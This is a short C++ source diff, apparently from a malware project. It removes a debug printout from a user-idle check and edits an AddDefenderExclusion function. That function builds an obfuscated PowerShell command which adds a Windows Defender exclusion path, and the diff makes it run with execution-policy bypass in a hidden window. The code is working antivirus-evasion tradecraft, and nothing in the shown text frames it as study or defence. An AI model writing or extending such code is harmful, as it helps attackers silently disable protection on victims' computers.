@@ -259,11 +259,6 @@ bool IsDeviceIdle(int minutes) {
     auto thresholdMs = std::chrono::minutes(minutes).count() * 60 * 1000;
     bool isIdle = (idleTimeMs >= thresholdMs);
 
-#ifdef ENABLE_DEBUG_CONSOLE
-    std::cout << "[IDLE_CHECK] Idle time: " << (idleTimeMs / 1000 / 60) << "m " << ((idleTimeMs / 1000) % 60) << "s, Threshold: " << minutes << "m, IsIdle: " << (isIdle ? "YES" : "NO") << std::endl;
-    std::cout.flush();
-#endif
-
     return isIdle;
 }
 
@@ -661,7 +656,7 @@ bool AddDefenderExclusion(const std::string& path) {
     if (!_CreateProcessW) return false;
 
     // Build PowerShell command to add exclusion
-    std::string psCmd = OBFUSCATE_STRING("powershell -NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '");
+    std::string psCmd = OBFUSCATE_STRING("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Add-MpPreference -ExclusionPath '");
     psCmd += path + OBFUSCATE_STRING("' -Force -ErrorAction SilentlyContinue\"");
 
 #ifdef ENABLE_DEBUG_CONSOLE
